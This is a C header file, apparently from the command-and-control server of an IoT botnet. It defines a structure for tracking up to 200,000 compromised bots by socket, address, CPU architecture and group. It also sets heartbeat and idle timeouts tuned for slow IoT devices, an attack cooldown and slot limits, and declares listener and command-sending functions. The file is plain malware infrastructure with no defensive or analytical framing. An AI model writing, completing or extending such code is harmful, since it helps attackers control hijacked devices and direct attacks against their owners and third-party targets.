// language: C, file: botnet.h, target: Linux, gcc
#ifndef BOTNET_H
#define BOTNET_H

#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include "login_utils.h"
#include "checks.h"

/* ── Capacity ────────────────────────────────────────────────────────── */
#define MAX_BOTS               200000   /* raise if server has >256 GB RAM    */
#define MAX_COMMAND_LENGTH     4096
#define ARCH_HANDSHAKE_TIMEOUT_MS 2000  /* was 1500 — give slow IoT more time */
#define BOT_IDLE_TIMEOUT_SEC   120      /* was 90  — more forgiving to NAT    */
#define PING_INTERVAL_SEC      20       /* was 15  — less overhead at scale   */

/* ── O(1) fd→bot-index map ───────────────────────────────────────────── *
 * Direct-indexed array: _fdmap[fd] = bot_array_index + 1, 0 = empty.   *
 * Size = FD_HARD_LIMIT * 4 bytes = 512 KB at 131072.                   *
 * Must be >= (CNC server ulimit -n).  Raise main.c setrlimit() too.    */
#define FD_HARD_LIMIT          131072

#define LIGHT_BLUE "\033[38;2;0;85;255m"
#define YELLOW "\033[33m"
#define RESET "\033[0m"
#define RED "\033[31m"
#define BLUE "\033[34m"
#define LIGHT_PINK "\033[95m"
#define NEON "\033[96m"
#define PINK "\033[35m"
#define GREEN "\033[32m"

typedef struct {
    int socket;
    struct sockaddr_in address;
    int is_valid;
    time_t last_seen;
    char arch[20];
    char group[64];
    pthread_mutex_t send_lock;
} Bot;

extern Bot  bots[MAX_BOTS];
extern int  bot_count;
extern int  global_cooldown;
extern int  g_maxslots;          /* global slot count, protected by g_maxslots_mutex */
extern pthread_mutex_t bot_mutex;
extern pthread_mutex_t cooldown_mutex;
extern pthread_mutex_t g_maxslots_mutex;
extern time_t g_start_time;

/* O(1) fd→bot-index map — internal to botnet.c but declared for inline use */
void fdmap_set(int fd, int idx);
void fdmap_clear(int fd);
int  fdmap_get(int fd);

void* bot_listener(void* arg);
void* ping_bots(void* arg);
void* manage_cooldown(void* arg);
void* cnc_listener(void* arg);
void cleanup_socket(int* socket);
void bot_send(int idx, const void* buf, size_t len);
void bot_teardown(int idx, const char* cause);
#endif